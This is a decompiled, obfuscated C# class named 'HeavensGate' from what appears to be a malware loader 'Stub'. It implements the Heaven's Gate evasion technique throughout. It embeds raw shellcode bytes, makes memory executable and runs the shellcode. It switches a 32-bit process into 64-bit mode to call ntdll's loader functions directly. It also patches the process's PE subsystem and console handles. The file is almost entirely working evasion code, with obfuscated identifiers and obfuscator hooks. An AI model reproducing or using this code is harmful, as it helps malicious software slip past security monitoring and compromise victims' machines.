using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000051 RID: 81
	internal sealed class HeavensGate
	{
		// Token: 0x0600017E RID: 382 RVA: 0x00013418 File Offset: 0x00011618
		static HeavensGate()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			HeavensGate.operational = false;
			HeavensGate.Kernel3264 = 0UL;
			HeavensGate.PAGE_EXECUTE_READWRITE = 64U;
			HeavensGate.Wow64ExecuteShellCode = new byte[]
			{
				85, 137, 229, 86, 87, 139, 117, 8, 139, 77,
				12, 232, 0, 0, 0, 0, 88, 131, 192, 42,
				131, 236, 8, 137, 226, 199, 66, 4, 51, 0,
				0, 0, 137, 2, 232, 14, 0, 0, 0, 102,
				140, 217, 142, 209, 131, 196, 20, 95, 94, 93,
				194, 8, 0, 139, 60, 36, byte.MaxValue, 42, 72, 49,
				192, 87, byte.MaxValue, 214, 95, 80, 199, 68, 36, 4,
				35, 0, 0, 0, 137, 60, 36, 72, 137, 194,
				33, 192, 72, 193, 234, 32, byte.MaxValue, 44, 36
			};
			if (!Environment.Is64BitProcess)
			{
				HeavensGate.CurrentProcessDuplicateHandle = NativeMethods.GetCurrentProcess();
				if (NativeMethods.DuplicateHandle(HeavensGate.CurrentProcessDuplicateHandle, HeavensGate.CurrentProcessDuplicateHandle, HeavensGate.CurrentProcessDuplicateHandle, ref HeavensGate.CurrentProcessDuplicateHandle, 0U, false, 2U))
				{
					HeavensGate.ntdll64 = Utils64.GetRemoteModuleHandle64Bit(HeavensGate.CurrentProcessDuplicateHandle, "ntdll.dll", 600);
					if (HeavensGate.ntdll64 != 0UL)
					{
						HeavensGate.LdrLoadDll = Utils64.GetRemoteProcAddress64Bit(HeavensGate.CurrentProcessDuplicateHandle, HeavensGate.ntdll64, "LdrLoadDll");
						if (HeavensGate.LdrLoadDll != 0UL)
						{
							HeavensGate.LdrUnloadDll = Utils64.GetRemoteProcAddress64Bit(HeavensGate.CurrentProcessDuplicateHandle, HeavensGate.ntdll64, "LdrUnloadDll");
							if (HeavensGate.LdrLoadDll != 0UL)
							{
								HeavensGate.LdrGetDllHandle = Utils64.GetRemoteProcAddress64Bit(HeavensGate.CurrentProcessDuplicateHandle, HeavensGate.ntdll64, "LdrGetDllHandle");
								if (HeavensGate.LdrGetDllHandle != 0UL)
								{
									HeavensGate.LdrGetProcedureAddress = Utils64.GetRemoteProcAddress64Bit(HeavensGate.CurrentProcessDuplicateHandle, HeavensGate.ntdll64, "LdrGetProcedureAddress");
									if (HeavensGate.LdrGetProcedureAddress != 0UL)
									{
										HeavensGate.operational = true;
									}
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x0600017F RID: 383 RVA: 0x0001357C File Offset: 0x0001177C
		private static IntPtr UlongParamsToIntPtr(ulong[] parameters)
		{
			IntPtr intPtr = Marshal.AllocHGlobal(parameters.Length * 8);
			for (int i = 0; i < parameters.Length; i++)
			{
				byte[] bytes = BitConverter.GetBytes(parameters[i]);
				Marshal.Copy(bytes, 0, intPtr + i * 8, bytes.Length);
			}
			return intPtr;
		}

		// Token: 0x06000180 RID: 384 RVA: 0x000135C8 File Offset: 0x000117C8
		private static ulong DispatchX64Call(byte[] code, ulong[] parameters)
		{
			ulong num = ulong.MaxValue;
			ulong num2;
			if (code == null || code.Length == 0)
			{
				num2 = num;
			}
			else
			{
				int num3 = HeavensGate.Wow64ExecuteShellCode.Length + code.Length;
				IntPtr intPtr = Marshal.AllocHGlobal(num3);
				Marshal.Copy(HeavensGate.Wow64ExecuteShellCode, 0, intPtr, HeavensGate.Wow64ExecuteShellCode.Length);
				Marshal.Copy(code, 0, intPtr + HeavensGate.Wow64ExecuteShellCode.Length, code.Length);
				uint num4;
				if (!NativeMethods.VirtualProtect(intPtr, (UIntPtr)((ulong)((long)num3)), HeavensGate.PAGE_EXECUTE_READWRITE, out num4))
				{
					throw new Exception("Couldnt set the shellcode memory as PAGE_EXECUTE_READWRITE!");
				}
				HeavensGate.Wow64Execution delegateForFunctionPointer = Marshal.GetDelegateForFunctionPointer<HeavensGate.Wow64Execution>(intPtr);
				IntPtr intPtr2 = IntPtr.Zero;
				if (parameters != null && parameters.Length != 0)
				{
					intPtr2 = HeavensGate.UlongParamsToIntPtr(parameters);
				}
				num = delegateForFunctionPointer(intPtr + HeavensGate.Wow64ExecuteShellCode.Length, intPtr2);
				Marshal.FreeHGlobal(intPtr);
				if (intPtr2 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(intPtr2);
				}
				num2 = num;
			}
			return num2;
		}

		// Token: 0x06000181 RID: 385 RVA: 0x000136B0 File Offset: 0x000118B0
		public static ulong Execute64(ulong Function, params ulong[] pFunctionParameters)
		{
			if (!HeavensGate.operational)
			{
				throw new Exception("HeavensGate did not start up properly or is on a x64 process");
			}
			int num = pFunctionParameters.Length;
			byte[] array = new byte[]
			{
				252, 72, 137, 206, 72, 137, 231, 72, 131, 236,
				16, 64, 128, 228, 0
			};
			byte[] array2 = new byte[]
			{
				49, 192, 73, 186, 241, byte.MaxValue, byte.MaxValue, byte.MaxValue, 0, 0,
				0, 0, 65, byte.MaxValue, 210, 72, 137, 252, 195
			};
			List<byte> list = new List<byte>(array);
			if (num < 4)
			{
				int num2 = ((num < 4) ? num : 4);
				for (int i = 0; i < num2; i++)
				{
					switch (i)
					{
					case 0:
						list.AddRange(new byte[] { 72, 139, 14 });
						break;
					case 1:
						list.AddRange(new byte[] { 72, 139, 86, 8 });
						break;
					case 2:
						list.AddRange(new byte[] { 76, 139, 70, 16 });
						break;
					case 3:
						list.AddRange(new byte[] { 76, 139, 78, 24 });
						break;
					}
				}
			}
			else
			{
				list.AddRange(new byte[]
				{
					72, 139, 14, 72, 139, 86, 8, 76, 139, 70,
					16, 76, 139, 78, 24
				});
				if (num % 2 != 0)
				{
					List<byte> list2 = list;
					byte[] array3 = new byte[2];
					array3[0] = 106;
					list2.AddRange(array3);
				}
				byte[] array4 = new byte[] { 72, 139, 70, 32, 80 };
				byte[] array5 = new byte[] { 72, 139, 134, 128, 0, 0, 0, 80 };
				if (num * 8 >= 2147483647)
				{
					return ulong.MaxValue;
				}
				for (int j = num - 1; j >= 4; j--)
				{
					if (j * 8 < 127)
					{
						array4[3] = (byte)(j * 8);
						list.AddRange(array4);
					}
					else
					{
						BitConverter.GetBytes(j * 8).CopyTo(array5, 3);
						list.AddRange(array5);
					}
				}
			}
			list.AddRange(new byte[] { 72, 131, 236, 32 });
			BitConverter.GetBytes(Function).CopyTo(array2, 4);
			list.AddRange(array2);
			return HeavensGate.DispatchX64Call(list.ToArray(), pFunctionParameters);
		}

		// Token: 0x06000182 RID: 386 RVA: 0x000138B8 File Offset: 0x00011AB8
		private static ulong GetProcessParameters()
		{
			InternalStructs64.PROCESS_BASIC_INFORMATION64 process_BASIC_INFORMATION = default(InternalStructs64.PROCESS_BASIC_INFORMATION64);
			uint num = (uint)Marshal.SizeOf<InternalStructs64.PROCESS_BASIC_INFORMATION64>(process_BASIC_INFORMATION);
			uint num2 = 0U;
			if (SpecialNativeMethods.NtWow64QueryInformationProcess64(HeavensGate.CurrentProcessDuplicateHandle, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref process_BASIC_INFORMATION, num, ref num2) != 0 || process_BASIC_INFORMATION.PebBaseAddress == 0UL)
			{
				throw new Exception("couldnt read PBI from process!");
			}
			ulong num3 = HeavensGate.GetProcessParameters64(process_BASIC_INFORMATION.PebBaseAddress);
			IntPtr intPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
			ulong num4 = 0UL;
			int num5 = SpecialNativeMethods.NtWow64ReadVirtualMemory64(HeavensGate.CurrentProcessDuplicateHandle, num3, intPtr, (ulong)((long)Marshal.SizeOf(typeof(InternalStructs.ULONGRESULT))), ref num4);
			if (num5 != 0)
			{
				Marshal.FreeHGlobal(intPtr);
				throw new Exception("Couldnt read the processParameters");
			}
			num3 = Marshal.PtrToStructure<InternalStructs.ULONGRESULT>(intPtr).Value;
			Marshal.FreeHGlobal(intPtr);
			return num3;
		}

		// Token: 0x06000183 RID: 387 RVA: 0x0001398C File Offset: 0x00011B8C
		private static ulong GetProcessParameters64(ulong addr)
		{
			return addr + 32UL;
		}

		// Token: 0x06000184 RID: 388 RVA: 0x000139A8 File Offset: 0x00011BA8
		private static InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 GetRTLParams()
		{
			ulong processParameters = HeavensGate.GetProcessParameters();
			int num = Marshal.SizeOf(typeof(InternalStructs64.RTL_USER_PROCESS_PARAMETERS64));
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			ulong num2 = 0UL;
			int num3 = SpecialNativeMethods.NtWow64ReadVirtualMemory64(HeavensGate.CurrentProcessDuplicateHandle, processParameters, intPtr, (ulong)((long)num), ref num2);
			if (num3 != 0)
			{
				Marshal.FreeHGlobal(intPtr);
				throw new Exception("Couldnt read the RTL_USER_PROCESS_PARAMETERS");
			}
			InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 rtl_USER_PROCESS_PARAMETERS = Marshal.PtrToStructure<InternalStructs64.RTL_USER_PROCESS_PARAMETERS64>(intPtr);
			Marshal.FreeHGlobal(intPtr);
			return rtl_USER_PROCESS_PARAMETERS;
		}

		// Token: 0x06000185 RID: 389 RVA: 0x00013A1C File Offset: 0x00011C1C
		private static void WriteRTLParams(InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 RTL_PARAMS)
		{
			ulong processParameters = HeavensGate.GetProcessParameters();
			int num = Marshal.SizeOf(typeof(InternalStructs64.RTL_USER_PROCESS_PARAMETERS64));
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			Marshal.StructureToPtr<InternalStructs64.RTL_USER_PROCESS_PARAMETERS64>(RTL_PARAMS, intPtr, false);
			ulong num2 = 0UL;
			int num3 = SpecialNativeMethods.NtWow64WriteVirtualMemory64(HeavensGate.CurrentProcessDuplicateHandle, processParameters, intPtr, (ulong)((long)num), ref num2);
			Marshal.FreeHGlobal(intPtr);
			if (num3 != 0)
			{
				throw new Exception("Couldnt write the RTL_USER_PROCESS_PARAMETERS");
			}
		}

		// Token: 0x06000186 RID: 390 RVA: 0x00013A84 File Offset: 0x00011C84
		private static Tuple<ulong[], uint[]> CaptureConsoleHandles64()
		{
			InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 rtlparams = HeavensGate.GetRTLParams();
			ulong[] array = new ulong[] { rtlparams.ConsoleHandle, rtlparams.StandardInput, rtlparams.StandardOutput, rtlparams.StandardError };
			uint[] array2 = new uint[] { rtlparams.WindowFlags, rtlparams.ConsoleFlags };
			return new Tuple<ulong[], uint[]>(array, array2);
		}

		// Token: 0x06000187 RID: 391 RVA: 0x00013AE4 File Offset: 0x00011CE4
		private static void WriteConsoleHandles64(ulong ConsoleHandle, ulong StandardInput, ulong StandardOutput, ulong StandardError, uint WindowFlags, uint ConsoleFlags)
		{
			HeavensGate.GetProcessParameters();
			InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 rtlparams = HeavensGate.GetRTLParams();
			rtlparams.ConsoleHandle = ConsoleHandle;
			rtlparams.StandardInput = StandardInput;
			rtlparams.StandardOutput = StandardOutput;
			rtlparams.StandardError = StandardError;
			rtlparams.WindowFlags = WindowFlags;
			rtlparams.ConsoleFlags = ConsoleFlags;
			HeavensGate.WriteRTLParams(rtlparams);
		}

		// Token: 0x06000188 RID: 392 RVA: 0x00013B38 File Offset: 0x00011D38
		private static void WriteConsoleHandles64(ulong[] handle, uint[] flags)
		{
			if (handle.Length != 4 || flags.Length != 2)
			{
				throw new Exception("invalid arguments, there must be 4 handles and 2 flags!");
			}
			HeavensGate.WriteConsoleHandles64(handle[0], handle[1], handle[2], handle[3], flags[0], flags[1]);
		}

		// Token: 0x06000189 RID: 393 RVA: 0x00013B7C File Offset: 0x00011D7C
		public static ulong LoadKernel32()
		{
			if (!HeavensGate.operational)
			{
				throw new Exception("HeavensGate did not start up properly or is on a x64 process");
			}
			ulong num;
			if (HeavensGate.Kernel3264 > 0UL)
			{
				num = HeavensGate.Kernel3264;
			}
			else
			{
				IntPtr intPtr = (IntPtr)((long)((ulong)Utils32.GetNtHeader32Addr(HeavensGate.CurrentProcessDuplicateHandle, (uint)(int)NativeMethods.GetModuleHandleW(null))));
				InternalStructs32.IMAGE_NT_HEADERS32 image_NT_HEADERS = Marshal.PtrToStructure<InternalStructs32.IMAGE_NT_HEADERS32>(intPtr);
				IntPtr intPtr2 = (IntPtr)((long)((ulong)((int)intPtr + (int)Marshal.OffsetOf(typeof(InternalStructs32.IMAGE_NT_HEADERS32), "OptionalHeader") + (int)Marshal.OffsetOf(typeof(InternalStructs32.IMAGE_OPTIONAL_HEADER32), "Subsystem"))));
				uint num2 = 4U;
				ushort num3 = 3;
				ushort num4 = 2;
				if (image_NT_HEADERS.OptionalHeader.Subsystem == 3)
				{
					uint num5;
					if (NativeMethods.VirtualProtect(intPtr2, (UIntPtr)((ulong)((long)Marshal.SizeOf(typeof(ushort)))), num2, out num5))
					{
						Tuple<ulong[], uint[]> tuple = HeavensGate.CaptureConsoleHandles64();
						HeavensGate.WriteConsoleHandles64(0UL, 0UL, 0UL, 0UL, 0U, 0U);
						Marshal.WriteInt16(intPtr2, (short)num4);
						HeavensGate.Kernel3264 = HeavensGate.LoadLibrary64("kernel32.dll");
						HeavensGate.WriteConsoleHandles64(tuple.Item1, tuple.Item2);
						Marshal.WriteInt16(intPtr2, (short)num3);
						NativeMethods.VirtualProtect(intPtr2, (UIntPtr)((ulong)((long)Marshal.SizeOf(typeof(ushort)))), num5, out num5);
					}
				}
				else
				{
					HeavensGate.Kernel3264 = HeavensGate.LoadLibrary64("kernel32.dll");
				}
				num = HeavensGate.Kernel3264;
			}
			return num;
		}

		// Token: 0x0600018A RID: 394 RVA: 0x00013D00 File Offset: 0x00011F00
		public static ulong GetModuleHandle64(string ModuleName)
		{
			if (!HeavensGate.operational)
			{
				throw new Exception("HeavensGate did not start up properly or is on a x64 process");
			}
			return Utils64.GetRemoteModuleHandle64Bit(HeavensGate.CurrentProcessDuplicateHandle, ModuleName, 600);
		}

		// Token: 0x0600018B RID: 395 RVA: 0x00013D34 File Offset: 0x00011F34
		public static ulong LoadLibrary64(string LibraryName)
		{
			if (!HeavensGate.operational)
			{
				throw new Exception("HeavensGate did not start up properly or is on a x64 process");
			}
			InternalStructs64.UNICODE_STRING64 unicode_STRING = new InternalStructs64.UNICODE_STRING64
			{
				Buffer = (ulong)(long)Marshal.StringToHGlobalUni(LibraryName),
				Length = (ushort)(LibraryName.Length * 2),
				MaximumLength = (ushort)((LibraryName.Length + 1) * 2)
			};
			IntPtr intPtr = Marshal.AllocHGlobal(Marshal.SizeOf<InternalStructs64.UNICODE_STRING64>(unicode_STRING));
			Marshal.StructureToPtr<InternalStructs64.UNICODE_STRING64>(unicode_STRING, intPtr, false);
			IntPtr intPtr2 = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(InternalStructs.ULONGRESULT)));
			ulong num = HeavensGate.Execute64(HeavensGate.LdrLoadDll, new ulong[]
			{
				0UL,
				0UL,
				(ulong)(long)intPtr,
				(ulong)(long)intPtr2
			});
			ulong value = Marshal.PtrToStructure<InternalStructs.ULONGRESULT>(intPtr2).Value;
			Marshal.FreeHGlobal((IntPtr)((long)unicode_STRING.Buffer));
			Marshal.FreeHGlobal(intPtr2);
			Marshal.FreeHGlobal(intPtr);
			ulong num2;
			if (num > 0UL)
			{
				num2 = 0UL;
			}
			else
			{
				num2 = value;
			}
			return num2;
		}

		// Token: 0x0600018C RID: 396 RVA: 0x00013E28 File Offset: 0x00012028
		public static bool FreeLibrary64(ulong ModuleHandle)
		{
			return HeavensGate.Execute64(HeavensGate.LdrUnloadDll, new ulong[] { ModuleHandle }) == 0UL;
		}

		// Token: 0x0600018D RID: 397 RVA: 0x00013E54 File Offset: 0x00012054
		public static ulong GetProcAddress64(ulong ModuleHandle, string FunctionName)
		{
			if (!HeavensGate.operational)
			{
				throw new Exception("HeavensGate did not start up properly or is on a x64 process");
			}
			return Utils64.GetRemoteProcAddress64Bit(HeavensGate.CurrentProcessDuplicateHandle, ModuleHandle, FunctionName);
		}

		// Token: 0x0600018E RID: 398 RVA: 0x000038B4 File Offset: 0x00001AB4
		public HeavensGate()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x040001E5 RID: 485
		public static bool operational;

		// Token: 0x040001E6 RID: 486
		private static ulong LdrLoadDll;

		// Token: 0x040001E7 RID: 487
		private static ulong LdrUnloadDll;

		// Token: 0x040001E8 RID: 488
		private static ulong LdrGetDllHandle;

		// Token: 0x040001E9 RID: 489
		private static ulong LdrGetProcedureAddress;

		// Token: 0x040001EA RID: 490
		private static IntPtr CurrentProcessDuplicateHandle;

		// Token: 0x040001EB RID: 491
		private static ulong ntdll64;

		// Token: 0x040001EC RID: 492
		private static ulong Kernel3264;

		// Token: 0x040001ED RID: 493
		private static uint PAGE_EXECUTE_READWRITE;

		// Token: 0x040001EE RID: 494
		private static byte[] Wow64ExecuteShellCode;

		// Token: 0x02000052 RID: 82
		private sealed class Wow64Execution : MulticastDelegate
		{
			// Token: 0x0600018F RID: 399
			public extern Wow64Execution(object @object, IntPtr method);

			// Token: 0x06000190 RID: 400
			public extern ulong Invoke(IntPtr func, IntPtr parameters);

			// Token: 0x06000191 RID: 401
			public extern IAsyncResult BeginInvoke(IntPtr func, IntPtr parameters, AsyncCallback callback, object @object);

			// Token: 0x06000192 RID: 402
			public extern ulong EndInvoke(IAsyncResult result);

			// Token: 0x06000193 RID: 403 RVA: 0x000038AD File Offset: 0x00001AAD
			static Wow64Execution()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}
		}
	}
}
